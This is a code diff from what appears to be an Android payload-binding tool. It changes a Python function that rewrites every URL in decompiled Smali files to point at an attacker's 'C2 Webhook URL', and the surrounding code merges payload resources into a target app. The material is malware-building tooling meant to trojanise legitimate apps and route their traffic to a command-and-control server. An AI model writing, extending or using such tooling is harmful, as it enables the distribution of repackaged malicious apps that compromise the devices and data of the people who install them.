@@ -196,25 +196,28 @@ def patch_c2_url(target_dir, web_url):
         return
     log_info(f"Patching C2 Webhook URL ({web_url}) into bound Smali classes...")
     web_url_clean = web_url.strip().rstrip('/')
+    url_pattern = re.compile(r'https?://[a-zA-Z0-9_.-]+(?::\d+)?(?:/[a-zA-Z0-9_.-]*)*')
 
+    count = 0
     for root, _, files in os.walk(target_dir):
-        if "com/labs/labrats" in root.replace("\\", "/"):
-            for f in files:
-                if f.endswith(".smali"):
-                    sf = os.path.join(root, f)
-                    try:
-                        with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
-                            content = sfile.read()
+        for f in files:
+            if f.endswith(".smali"):
+                sf = os.path.join(root, f)
+                try:
+                    with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
+                        content = sfile.read()
 
-                        new_content = re.sub(r'https?://[a-zA-Z0-9_.-]+(?::\d+)?(?:/[a-zA-Z0-9_.-]*)*', web_url_clean, content)
+                    if "onrender.com" in content or "WEBHOOK_URL" in content or "http://" in content or "https://" in content:
+                        new_content = url_pattern.sub(web_url_clean, content)
                         new_content = re.sub(r'(\.field\s+public\s+static\s+final\s+WEBHOOK_URL:Ljava/lang/String;\s*=\s*")[^"]*(")', r'\1' + web_url_clean + r'\2', new_content)
 
                         if new_content != content:
                             with open(sf, 'w', encoding='utf-8') as sfile:
                                 sfile.write(new_content)
-                    except Exception:
-                        pass
-    log_success("C2 Webhook URL successfully patched into Smali classes.")
+                            count += 1
+                except Exception:
+                    pass
+    log_success(f"C2 Webhook URL successfully patched in {count} Smali files.")
 
 
 def merge_resources(payload_dir, target_dir):
